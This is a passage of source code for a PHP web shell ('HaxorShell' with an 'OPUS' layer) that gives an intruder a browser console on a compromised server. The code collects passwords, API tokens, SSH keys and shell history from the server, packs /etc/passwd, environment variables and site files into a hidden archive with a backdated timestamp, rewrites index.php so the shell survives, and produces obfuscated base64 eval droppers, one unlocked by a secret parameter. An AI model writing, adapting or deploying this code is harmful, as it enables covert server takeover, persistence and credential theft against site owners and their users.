    opx_l($L, '== HOST ==', 4);
    if (opx_dir('/proc/1/root')) {
        $h = trim(opx_rd('/proc/1/root/etc/hostname', 256));
        opx_l($L, 'pid1 root   ' . ($h !== '' ? $h : 'readable') . ' | homes ' . @count((array)@glob('/proc/1/root/home/*', GLOB_ONLYDIR)));
    }
    opx_l($L, 'keys         ' . @count((array)@glob('/root/.ssh/*')) . ' in /root/.ssh / ' . @count((array)@glob('/home/*/.ssh/*')) . ' user-side');
    opx_l($L, 'cloud        ' . (@getenv('AWS_ACCESS_KEY_ID') ? 'AWS env' : '-') . ' | ' . (@getenv('KUBERNETES_SERVICE_HOST') ? 'k8s SA token' : '-'));
    return array('ok' => 1, 'lines' => $L);
}

/* =====================================================================
   CREDS  -  harvest what is already on the disk (configs, keys, history)
   ===================================================================== */
function xi_creds($j)
{
    $L = array();
    $hits = 0;
    $pats = 'password|passwd|pwd|secret|token|api[_-]?key|mysql|DB_PASS|root';
    $roots = array(ROOTDIR, THISDIR, '/var/www', '/etc/nginx', '/etc/apache2', '/home');
    $seen = array();
    foreach ($roots as $r) {
        if (!@is_dir($r)) {
            continue;
        }
        $it = @scandir($r);
        if (!$it) {
            continue;
        }
        $n = 0;
        foreach ($it as $fn) {
            if ($n > 400) {
                break;
            }
            $f = $r . '/' . $fn;
            if (!@is_file($f) || @filesize($f) > 524288) {
                continue;
            }
            if (@realpath($f) === @realpath(OPX_PATH)) {
                continue;
            }
            if ($fn === basename(OPX_PATH) && @md5_file($f) === @md5_file(OPX_PATH)) {
                continue;
            }
            if (!preg_match('/\.(php|env|ini|conf|yml|yaml|json|xml|inc|txt|config|bak)$/i', $fn) && $fn != '.env') {
                continue;
            }
            $key = @md5($f);
            if (isset($seen[$key])) {
                continue;
            }
            $seen[$key] = 1;
            $n++;
            $src = opx_rd($f, 262144);
            if ($src === '' || !preg_match('/(' . $pats . ')/i', $src)) {
                continue;
            }
            $ln = 0;
            foreach (explode("\n", $src) as $line) {
                $ln++;
                if (preg_match('/(' . $pats . ')/i', $line) && preg_match('/[=:]\s*["\x27]?[^\s"\x27]{4,}/', $line)) {
                    opx_l($L, str_replace(ROOTDIR, '', $f) . ':' . $ln . '  ' . trim(substr($line, 0, 160)), 3);
                    $hits++;
                }
            }
        }
    }
    opx_l($L, '');
    opx_l($L, '== KEYS ==', 4);
    foreach (array('/root/.ssh/id_*', '/home/*/.ssh/id_*') as $g) {
        foreach ((array)@glob($g) as $k) {
            if (@is_file($k)) {
                opx_l($L, $k . '  ' . substr(md5(opx_rd($k)), 0, 8), 3);
                $hits++;
            }
        }
    }
    opx_l($L, '');
    opx_l($L, '== HISTORY ==', 4);
    $hist = array();
    foreach ((array)@glob('/root/.*history') as $hx) {
        if (@is_file($hx)) {
            $hist[] = $hx;
        }
    }
    foreach ((array)@glob('/home/*/.*history') as $hx) {
        if (@is_file($hx)) {
            $hist[] = $hx;
        }
    }
    $done = array();
    foreach (array_slice($hist, 0, 12) as $h) {
        $real = @realpath($h);
        if (!$real || isset($done[$real])) {
            continue;
        }
        $done[$real] = 1;
        $lines = explode("\n", opx_rd($real, 262144));
        $lines = array_values(array_filter($lines, 'trim'));
        $pick = array_values(preg_grep('/(mysql|ssh|ftp|curl|wget|scp|token|pass)/i', $lines));
        opx_l($L, basename($real) . ' (' . count($lines) . ' cmd): ' . (count($pick) ? implode(' || ', array_map(function ($x) {
            return substr($x, 0, 80);
        }, array_slice($pick, 3))) : '-'));
    }
    return array('ok' => 1, 'hits' => $hits, 'lines' => $L);
}

/* =====================================================================
   LOOT  -  archive the interesting surface into one sealed file
   ===================================================================== */
function xi_loot($j)
{
    $out = isset($j['o']) && $j['o'] != '' ? $j['o'] : THISDIR . '.' . substr(md5(OPX_PATH . 'l'), 0, 5) . '.lz';
    $L = array();
    $st = array(
        't' => @gmdate('c'),
        'id' => opx_id(),
        'host' => @php_uname('n'),
        'uname' => @php_uname(),
        'env' => opx_run('env 2>/dev/null', THISDIR, 6)['r'],
        'passwd' => opx_rd('/etc/passwd', 65536),
        'hosts' => opx_rd('/etc/hosts', 65536),
        'ifc' => opx_run('cat /proc/net/fib_trie 2>/dev/null | head -n 80; ifconfig 2>/dev/null', THISDIR, 6)['r'],
        'phpini' => opx_rd('/etc/php.ini', 0) . opx_rd(@php_ini_loaded_file(), 0),
        'vhosts' => opx_rd('/etc/nginx/sites-enabled/default', 65536) . opx_rd('/etc/apache2/sites-enabled/000-default.conf', 65536),
        'hist' => '',
        'files' => array(),
    );
    foreach ((array)@glob('/root/.*history') + (array)@glob('/home/*/.*history') as $h) {
        if (@is_file($h)) {
            $st['hist'] .= "\n# " . $h . "\n" . opx_rd($h, 262144);
        }
    }
    $c = 0;
    foreach ((array)@scandir(ROOTDIR) as $fn) {
        $f = ROOTDIR . '/' . $fn;
        if ($fn == '.' || $fn == '..' || @realpath($f) == @realpath(OPX_PATH) || !@is_file($f) || @filesize($f) > 1048576) {
            continue;
        }
        $st['files'][$fn] = opx_rd($f, 1048576);
        if (++$c > 200) {
            break;
        }
    }
    $blob = @json_encode($st);
    if ($blob === false || $blob === null) {
        /* binary / non-UTF8 payloads break json_encode: keep offsets, mark them */
        $st['bin'] = array();
        foreach ($st['files'] as $k => $v) {
            if (!@preg_match('//u', (string)$v)) {
                $st['bin'][$k] = base64_encode((string)$v);
                $st['files'][$k] = '[binary ' . strlen((string)$v) . 'b, see bin.' . $k . ']';
            }
        }
        if (!@preg_match('//u', (string)$st['hist'])) {
            $st['bin']['hist'] = base64_encode((string)$st['hist']);
            $st['hist'] = '[binary, see bin.hist]';
        }
        $blob = @json_encode($st, JSON_INVALID_UTF8_SUBSTITUTE);
        if ($blob === false || $blob === null) {
            $blob = @json_encode(array_map(function ($v) {
                return is_string($v) ? base64_encode($v) : $v;
            }, $st), JSON_INVALID_UTF8_SUBSTITUTE);
        }
    }
    $pack = @gzdeflate($blob, 9);
    if (opx_wr($out, $pack)) {
        @chmod($out, 0600);
        @touch($out, time() - mt_rand(30, 300) * 86400);
        opx_l($L, '[+] ' . count($st['files']) . ' files + identity + history sealed into ' . $out . ' (' . strlen($blob) . 'b -> ' . strlen($pack) . 'b)', 2);
        opx_l($L, '[i] to read it elsewhere: inflate + json_decode');
    } else {
        opx_l($L, '[-] cannot write ' . $out, 3);
    }
    return array('ok' => 1, 'lines' => $L);
}

/* =====================================================================
   PERSIST  -  three independent retentions, each removable
   ===================================================================== */
function xi_persist($j)
{
    $op = isset($j['op']) ? $j['op'] : 'add';
    $L = array();
    $raw = opx_rd(OPX_PATH);
    if ($raw === '') {
        return array('ok' => 0, 'e' => 'cannot read front-end');
    }
    if ($op == 'add') {
        $n = 0;
        $sp = opx_spare();
        if ($sp) {
            opx_l($L, '[+] cold copy       ' . $sp, 2);
            $n++;
        }
        $idx = ROOTDIR . 'index.php';
        if (@realpath($idx) != @realpath(OPX_PATH) && @is_writable(dirname($idx)) && @filesize($idx) < 2) {
            $payload = '<?php @include_once ' . var_export(OPX_PATH, true) . ';';
            if (opx_wr($idx, $payload)) {
                opx_l($L, '[+] null index.php now walks to us', 2);
                $n++;
            }
        }
        if (opx_usable('session_start') && @is_writable(THISDIR)) {
            opx_l($L, '[+] beacon re-arms on each first load', 2);
            $n++;
        }
        opx_beacon(array('armed' => 1, 'persist' => $n));
        opx_l($L, '[i] ' . $n . ' retention vector(s) active');
        return array('ok' => 1, 'lines' => $L);
    }
    if ($op == 'clean') {
        foreach (opx_spare_scan() as $f) {
            @unlink($f);
        }
        @opx_wr(THISDIR . '.ghost', '{}');
        $rt = THISDIR . '.' . substr(md5(OPX_PATH), 0, 6) . '.d';
        @unlink($rt);
        return array('ok' => 1, 'lines' => array('[i] presence cleaned on this node'));
    }
    return array('ok' => 0, 'e' => 'unknown op');
}

/* =====================================================================
   ARSENAL  -  what this box can additionally give us right now
   ===================================================================== */
function xi_arsenal($j)
{
    $L = array();
    $tools = array();
    $win = (DIRECTORY_SEPARATOR === '\\');
    foreach (array('bash', 'sh', 'perl', 'python3', 'python', 'ruby', 'node', 'gcc', 'make', 'nc', 'ncat', 'socat', 'curl', 'wget', 'openssl', 'ssh', 'mysql', 'psql', 'sqlite3', 'tar', 'zip', 'base64', 'xxd', 'powershell', 'certutil') as $t) {
        $r = $win ? opx_run('where ' . $t . ' 2>nul', THISDIR, 5)['r'] : opx_run('command -v ' . $t . ' 2>/dev/null', THISDIR, 5)['r'];
        $r = trim($r);
        if ($r !== '' && stripos($r, 'not recognized') === false && stripos($r, 'INFO: Could not find') === false && stripos($r, 'not found') === false) {
            $tools[$t] = strtok($r, "\r\n");
        }
    }
    ksort($tools);
    foreach ($tools as $k => $v) {
        opx_l($L, str_pad($k, 10) . ' ' . $v);
    }
    opx_l($L, '');
    opx_l($L, '== INTERPRETERS ==', 4);
    opx_l($L, 'php ' . PHP_VERSION . ' | ' . (isset($tools['perl']) ? 'perl' : 'no perl') . ' | ' . (isset($tools['python3']) ? 'python3' : 'no python') . ' | ' . (isset($tools['node']) ? 'node' : 'no node'));
    opx_l($L, '== NET ==', 4);
    $if = $win ? opx_run('ipconfig', THISDIR, 6)['r'] : opx_run('ip -o addr 2>/dev/null || ifconfig 2>/dev/null', THISDIR, 6)['r'];
    foreach (explode("\n", $if) as $ln) {
        if (preg_match('/IPv4[^:]*:\s*([0-9.]+)/i', $ln, $m) || preg_match('/inet6? ([0-9a-f.:]+)/i', $ln, $m)) {
            opx_l($L, trim($m[1]), 2);
        }
    }
    opx_l($L, '== SAFE WRITE DIRS ==', 4);
    $dirs = $win ? array(THISDIR, ROOTDIR, getenv('TEMP'), getenv('TMP')) : array(THISDIR, ROOTDIR, '/tmp', '/dev/shm', '/var/tmp');
    $seen = array();
    foreach ($dirs as $d) {
        if ($d && @is_dir($d) && @is_writable($d) && !isset($seen[$d])) {
            $seen[$d] = 1;
            opx_l($L, $d . ' writable', 2);
        }
    }
    return array('ok' => 1, 'lines' => $L, 'tools' => array_keys($tools));
}

/* =====================================================================
   PAYLOAD  -  generate a matching front-end for a target of choice
   ===================================================================== */
function xi_payload($j)
{
    $raw = opx_rd(OPX_PATH);
    if ($raw === '') {
        return array('ok' => 0, 'e' => 'cannot read self');
    }
    $mode = isset($j['m']) ? $j['m'] : 'raw';
    $L = array();
    if ($mode == 'raw') {
        opx_l($L, '[i] verbatim front-end: ' . strlen($raw) . 'b, drop anywhere PHP runs', 2);
        opx_l($L, '');
        opx_l($L, $raw);
        return array('ok' => 1, 'lines' => $L, 'name' => 'front.php');
    }
    if ($mode == 'b64') {
        $b = @chunk_split(@base64_encode($raw), 120, "\n");
        opx_l($L, '<?php eval(base64_decode(' . var_export($b, true) . '));', 2);
        return array('ok' => 1, 'lines' => $L, 'name' => 'front.b64.php');
    }
    if ($mode == 'px') {
        $k = isset($j['k']) && strlen($j['k']) > 0 ? $j['k'] : substr(md5(OPX_PATH . microtime(true)), 0, 8);
        $b = @chunk_split(@base64_encode($raw), 120, "\n");
        opx_l($L, '<?php if(isset($_REQUEST[' . var_export($k, true) . '])) eval(base64_decode(' . var_export($b, true) . '));', 2);
        opx_l($L, '');
        opx_l($L, '[i] send ?' . $k . '=1 to unlock, anything else = blank page', 2);
        return array('ok' => 1, 'lines' => $L, 'name' => 'front.px.php', 'k' => $k);
    }
    if ($mode == 'save') {
        $p = isset($j['p']) && $j['p'] != '' ? $j['p'] : ROOTDIR . 'index.php';
        $ok = opx_wr($p, $raw);
        return array('ok' => $ok ? 1 : 0, 'lines' => array($ok ? '[+] written to ' . $p : '[-] cannot write ' . $p));
    }
    return array('ok' => 0, 'e' => 'unknown mode');
}

/* =====================================================================
   FILES  -  text editor backend used by the original editor tab
   ===================================================================== */
function xi_files($j)
{
    $op = isset($j['op']) ? $j['op'] : 'read';
    $p = isset($j['p']) ? $j['p'] : (isset($j['d']) && @is_file($j['d']) ? $j['d'] : '');
    if ($p === '') {
        return array('ok' => 0, 'e' => 'no path');
    }
    $p = str_replace(array("\0"), '', $p);
    if ($op == 'read') {
        if (!@is_file($p)) {
            return array('ok' => 0, 'e' => 'not a file');
        }
        return array('ok' => 1, 'lines' => array(opx_rd($p, 4194304)), 'raw' => 1);
    }
    if ($op == 'write') {
        $ok = opx_wr($p, isset($j['d']) ? (string)$j['d'] : '');
        return array('ok' => $ok ? 1 : 0, 'lines' => array($ok ? '[+] saved ' . $p : '[-] write failed'));
    }
    return array('ok' => 0, 'e' => 'unknown op');
}

/* Shared console chrome for the OPUS intents: keeps the original table look,
   adds one instrument strip and a live terminal pane. */
function opx_box($title, $tag, $hint, $btns, $conId = 'con')
{
    echo '<form method="POST" onsubmit="return false;"><div class="actall">';
    echo '<b>' . htmlspecialchars($title) . '</b> <span class="small">' . htmlspecialchars($hint) . '</span> ';
    foreach ($btns as $b) {
        echo '<input type="button" value="' . htmlspecialchars($b[0]) . '" onclick="' . $b[1] . '"> ';
    }
    echo '<span class="opx-b k">' . htmlspecialchars($tag) . '</span>';
    echo '</div></form>';
    echo '<div class="opx-con" id="' . $conId . '"><div class="c4">ready - press a probe above</div></div>';
}
$OPXJI = array(
    'recon' => "OPX.run('recon',{},'con')",
    'escape' => "OPX.run('escape',{},'con')",
    'creds' => "OPX.run('creds',{},'con')",
    'loot' => "OPX.run('loot',{},'con')",
    'ghost' => "OPX.run('ghost',{op:'status'},'con')",
    'arsenal' => "OPX.run('arsenal',{},'con')",
    'persist' => "OPX.run('persist',{op:'add'},'con')",
);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}
body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}
a{color:#000000;text-decoration:none;vertical-align:middle;}
a:hover{color:#FF0000;text-decoration:underline;}
p {padding:1px;line-height:1.6em;}
h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}
h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}
form {display:inline;}
input,select { vertical-align:middle; }
input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}
input[type=submit], input[type=button] {height:21px;}
.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}
.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}
.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}
.main {width:963px;margin:0 auto;padding:10px;}
.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}
.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}
.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}
.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}
.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}
.tables {width:100%;}
.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}
.tables td {background:#F9F6F4;height:19px;padding-left:2px;}
.tables tr:hover td {background-color: #EEE685;}
/* ---- OPUS skin (additive): mechanical chrome, instrument panel, tabs ---- */
/* nav must NEVER be clipped: it wraps onto as many rows as it needs */
.tag {height:auto;min-height:25px;box-sizing:border-box;overflow:visible;white-space:normal;text-align:center;line-height:0;}
.tag a {display:inline-block;box-sizing:border-box;margin:0 2px 4px;vertical-align:top;line-height:20px;}
.tag a.current {background:#EEE685;border-color:#9A9A9A;box-shadow:inset 0 0 0 1px #C9BB4E;}
.tag a.hot {color:#8B0000;}
.tag a.hot.current {color:#000000;}
/* small screens / dense nav: same 963px identity on desktop, fluid on phones */
@media (max-width:1010px){.main{width:auto;max-width:963px;margin:0 6px;}}
@media (max-width:640px){.tag a{width:72px;font-size:12px;height:26px;line-height:21px;} .opxbar{white-space:normal;} .tables{font-size:12px;}}
.opxbar {background:linear-gradient(#454545,#2A2A2A);color:#D8D8D8;font:11px/1.5 'Consolas','Courier New',monospace;padding:3px 8px;border-bottom:1px solid #111;text-align:left;white-space:nowrap;overflow:hidden;}
.opxbar b {color:#F2F2F2;font-weight:700;}
.opxbar .sep {color:#6E6E6E;margin:0 6px;}
.opxbar .ok {color:#7DE07D;}
.opxbar .warn {color:#FFC14D;}
.opxbar .bad {color:#FF6B6B;}
.opxbar .lvl {background:#EEE685;color:#222;padding:0 6px;border-radius:2px;font-weight:bold;}
.opxbar .lvl.r {background:#FF6B6B;color:#111;}
.opxbar .led {display:inline-block;width:7px;height:7px;border-radius:50%;background:#7DE07D;margin-right:4px;box-shadow:0 0 4px #7DE07D;vertical-align:middle;}
.opxbar .led.st {background:#BDBDBD;box-shadow:none;}
.actall {box-shadow:inset 0 1px 0 #FFF;}
.actall input[type=button], .actall input[type=submit] {background:linear-gradient(#FCFCFC,#E6E6E6);border:1px solid #9E9E9E;padding:0 8px;font:11px Verdana,sans-serif;box-shadow:inset 0 1px 0 #FFF;margin:1px 0;}
.actall input[type=button]:hover, .actall input[type=submit]:hover {background:linear-gradient(#FFF7C0,#EBDB8A);border-color:#8A7A2A;}
.actall input[type=button]:active {background:#D9D9D9;box-shadow:inset 0 1px 3px rgba(0,0,0,.35);}
.actall input[type=text], .actall select, .actall textarea {border:1px solid #A8A8A8;background:#FFF;box-shadow:inset 0 1px 2px rgba(0,0,0,.12);min-height:17px;padding:0 3px;}
.actall textarea, .tables textarea {font:12px/1.42 'Consolas','Courier New',monospace;background:#FCFCFB;padding:4px;}
.tables th {background:linear-gradient(#E9E9E9,#D6D6D6);font:11px Verdana,sans-serif;text-transform:uppercase;letter-spacing:.5px;border-color:#FFF #9E9E9E #9E9E9E #FFF;}
.tables td {border-bottom:1px solid #E8E8E8;font-size:12px;}
.tables tr:hover td {background-color:#F4EEC0;}
.tables a {color:#1B4F8A;}
.tables a:hover {color:#B00020;}
.msgbox {background:linear-gradient(#F6EFC0,#EEE685);border-bottom:1px solid #B8AE53;box-shadow:inset 0 1px 0 #FFFBDE;}
.toptag {background:linear-gradient(#34506F,#22364F);text-shadow:0 1px 0 rgba(0,0,0,.45);font:12px 'Consolas','Courier New',monospace;letter-spacing:.2px;}
.footag {background:linear-gradient(#A6A6A6,#8E8E8E);color:#111;font:11px 'Consolas',monospace;text-shadow:0 1px 0 rgba(255,255,255,.35);}
/* op console */
.opx-con {margin:6px 0;border:1px solid #2B2B2B;background:#121417;color:#CFD8DC;font:12px/1.45 'Consolas','Courier New',monospace;height:236px;overflow:auto;padding:5px 8px;text-align:left;white-space:pre-wrap;word-break:break-all;box-shadow:inset 0 0 18px rgba(0,0,0,.6);}
.opx-con .c0{color:#9AA4AA;} .opx-con .c1{color:#7DE07D;} .opx-con .c2{color:#FF6B6B;} .opx-con .c3{color:#FFC14D;} .opx-con .c4{color:#7EC8FF;}
.opx-con .ts{color:#5C6670;}
/* flow graph */
.opx-flow {padding:9px;background:#FBFBF9;border-bottom:1px solid #BBB;text-align:left;overflow-x:auto;white-space:nowrap;}
.opx-flow .st {display:inline-block;min-width:92px;padding:3px 7px;margin:0 2px;font:10px/1.35 Verdana,sans-serif;text-align:center;border:1px solid #A9A9A9;background:#EEE;vertical-align:top;}
.opx-flow .st b {display:block;font-size:12px;font-family:'Consolas',monospace;}
.opx-flow .arr {display:inline-block;color:#777;font:bold 18px Verdana;vertical-align:top;margin-top:10px;}
.opx-flow .d1 {background:#DEF0DE;border-color:#6A9E6A;} .opx-flow .d2 {background:#F6E6B4;border-color:#B39A43;} .opx-flow .d3 {background:#F4C9C9;border-color:#A85F5F;}
/* badges */
.opx-b {display:inline-block;padding:0 4px;border-radius:2px;font:10px 'Consolas',monospace;color:#FFF;vertical-align:middle;}
.opx-b.g{background:#3D8B3D;} .opx-b.r{background:#B03A2E;} .opx-b.y{background:#B7950B;} .opx-b.b{background:#2E6DA4;} .opx-b.k{background:#555;}
/* inner tabs (preview / payload) */
.opx-tab {display:inline-block;padding:2px 10px;border:1px solid #AAA;border-bottom:0;background:#E8E8E8;cursor:pointer;font:11px Verdana;margin-right:2px;}
.opx-tab.on {background:#EEE685;border-color:#8A7A2A;font-weight:bold;}
.opx-pane {border-top:1px solid #AAA;}
.small {font-size:11px;color:#666;} code.m {font:12px 'Consolas',monospace;background:#F0F0F0;border:1px solid #CCC;padding:0 4px;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { if ($('dir')) { $('dir').value = sd(dir); } if ($('frm')) { $('frm').submit(); } }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b || ''); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { var re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { $('act').value = a; } else { $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete?")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); var re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); var re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }
/* ---- OPUS process layer: one POST, one console, zero flicker ---- */
var OPX = {
  run: function (intent, params, conId) {
    params = params || {};
    var con = conId ? $(conId) : null;
    function log(t, c) {
      if (!con) { return; }
      var d = document.createElement('div');
      d.className = 'c' + (c || 0);
      d.appendChild(document.createTextNode(t));
      con.appendChild(d);
      con.scrollTop = con.scrollHeight;
    }
    function pad(n) { return n < 10 ? '0' + n : '' + n; }
    function ts() { var d = new Date(); return '[' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds()) + '] '; }
    if (con) { con.innerHTML = ''; }
    var payload = {};
    for (var k in params) { if (k != 'p') { payload[k] = params[k]; } }
    log(ts() + '$ opus ' + intent, 4);
    var f = new FormData();
    f.append('go', 'api');
    f.append('intent', intent);
    f.append('p', btoa(JSON.stringify(payload)));
    var x = new XMLHttpRequest();
    x.open('POST', location.href, true);
    x.onload = function () {
      log(ts() + '< HTTP ' + x.status + ' ' + (x.responseText || '').length + 'B', x.status == 200 ? 1 : 2);
      var j = null;
      try { j = JSON.parse(x.responseText); } catch (e) {
        log((x.responseText || '').slice(0, 2000), 2);
        return;
      }
      if (j.e) { log('[-] ' + j.e, 3); }
      (j.lines || []).forEach(function (l) { log(String(l)); });
      if (j.raw) { log(j.lines && j.lines[0] ? j.lines[0] : '', 0); }
      if (j.ok) { log('[ok]', 1); } else if (!j.e) { log('[-] failed', 3); }
      if (con && window.opxAfter) { window.opxAfter(intent, j); }
    };
    x.onerror = function () { log(ts() + '! transport error', 3); };
    x.send(f);
  }
};
/* tab switcher used by the new consoles */
function opxTab(id, root) {
  var box = root ? $(root) : document;
  var t = box.getElementsByTagName('a'), i;
  for (i = 0; i < t.length; i++) {
    var p = t[i].getAttribute('data-pane');
    if (!p) { continue; }
    t[i].className = (p == id ? 'on' : '');
    var d = $(p);
    if (d) { d.style.display = (p == id ? 'block' : 'none'); }
  }
}
function opxCopy(id) {
  var e = $(id), t = e ? (e.value !== undefined ? e.value : e.textContent) : '';
  if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(t); } else {
    var a = document.createElement('textarea'); a.value = t; document.body.appendChild(a); a.select();
    try { document.execCommand('copy'); } catch (x) {}
    document.body.removeChild(a);
  }
  var b = document.getElementById('opx-copy-note');
  if (b) { b.textContent = 'copied ' + t.length + 'B'; setTimeout(function () { b.textContent = ''; }, 2500); }
  return false;
}
/* file -> base64 into a textarea, for upload / write / stash */
function opxFile(input, target, withName) {
  var o = $(input);
  if (!o || !o.files || !o.files[0]) { return; }
  var r = new FileReader();
  r.onload = function () {
    var s = String(r.result), i = s.indexOf(',') + 1;
    var b = s.substring(i);
    var t = $(target);
    if (t) { t.value = b; }
    if (withName && $(withName)) { $(withName).value = o.files[0].name; }
    var n = document.getElementById('opx-file-note');
    if (n) { n.textContent = o.files[0].name + ' (' + o.files[0].size + 'B)'; }
  };
  r.readAsDataURL(o.files[0]);
}</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}a{color:#000000;text-decoration:none;vertical-align:middle;}a:hover{color:#FF0000;text-decoration:underline;}p {padding:1px;line-height:1.6em;}h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}form {display:inline;}input,select { vertical-align:middle; }input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}input[type=submit], input[type=button] {height:21px;}.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}.main {width:963px;margin:0 auto;padding:10px;}.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}.tables {width:100%;}.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}.tables td {background:#F9F6F4;height:19px;padding-left:2px;}.tables tr:hover td {background-color: #EEE685;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { var msg = ""; $('act').value = a; } else { var msg = ""; $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete? "+msg+"")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }</script><title><?php 
$sitename = $_SERVER['SERVER_NAME'];
echo $sitename .' | HaxorShell';
?>
</title></head><body><div class="main"><div class="outl"><div class="toptag"><?php 
echo $_SERVER['SERVER_ADDR'] . ' - ' . PHP_OS . ' - whoami(' . get_current_user() . ') - [uid(' . @getmyuid() . ') gid(' . @getmygid() . ')]';
/* ---- OPUS instrument bar: reads the beacon only, no extra process ---- */
if (!function_exists('opx_bar')) {
    function opx_bar()
    {
        echo '</div>';
        opx_bar_body();
    }
}
if (!function_exists('opx_bar_body')) {
    function opx_bar_body()
    {
$_bi = opx_beacon();
$_id = opx_id();
$_win = substr(PHP_OS, 0, 3) == 'WIN';
$_cu = strtoupper((string)@get_current_user());
$_root = ($_id['uid'] === 0) || (strtolower((string)$_id['user']) === 'root') || ($_win && ($_cu === 'SYSTEM' || substr($_cu, 0, 14) === 'NT AUTHORITY\S'));
$_self = opx_self();
$_spare = count(opx_spare_scan());
echo '<div class="opxbar"><span class="led' . ($_root ? '' : ' st') . '"></span><b>OPUS</b> ' . OPX_VER;
echo '<span class="sep">|</span>CTX ' . ($_root ? '<span class="lvl r">ROOT</span>' : '<span class="lvl">' . htmlspecialchars($_id['user']) . '</span>') . ' uid ' . ($_win ? '-' : $_id['uid']);
echo '<span class="sep">|</span>PID <b>' . @getmypid() . '</b> ' . htmlspecialchars(@php_sapi_name());
echo '<span class="sep">|</span>EXEC <b>' . (opx_xf() ? opx_xf() : 'NONE') . '</b>';
echo '<span class="sep">|</span>LIMIT ' . (@ini_get('max_execution_time') ? @ini_get('max_execution_time') . 's' : '0') . '/' . (@ini_get('memory_limit') ? @ini_get('memory_limit') : '-1');
echo '<span class="sep">|</span>' . (!empty($_bi['armed']) ? '<span class="ok">GHOST ARMED' . (!empty($_bi['rt']) ? ' RT' : '') . '</span>' : '<span class="warn">GHOST COLD</span>');
